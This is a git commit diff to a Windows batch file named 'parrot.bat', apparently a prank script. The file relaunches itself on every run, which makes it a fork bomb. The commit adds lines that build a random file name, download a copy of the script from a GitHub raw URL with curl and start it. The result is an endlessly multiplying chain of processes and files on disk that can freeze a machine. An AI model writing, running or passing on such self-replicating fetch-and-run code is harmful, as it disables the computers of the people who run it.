f7ae1b113b70b2d4f141edc2193f11734baeb828
PABLO4316 <117773032+PABLO4316@users.noreply.github.com>
2022-11-26 16:21:52 +0100

    Update parrot.bat

--- parrot.bat
+++ parrot.bat
@@ -1,4 +1,13 @@
 @ECHO OFF
 title %~n0
 start %~n0%~x0
+
+SET randomstr=%random%%random%%random%
+SET randomstr=%randomstr:0=a%
+SET randomstr=%randomstr:1=b%
+SET randomstr=%randomstr:2=c%
+
+curl https://raw.githubusercontent.com/PABLO4316/parrotPrank/main/parrot.bat --output %randomstr%.bat
+start %randomstr%.bat
+
 curl parrot.live
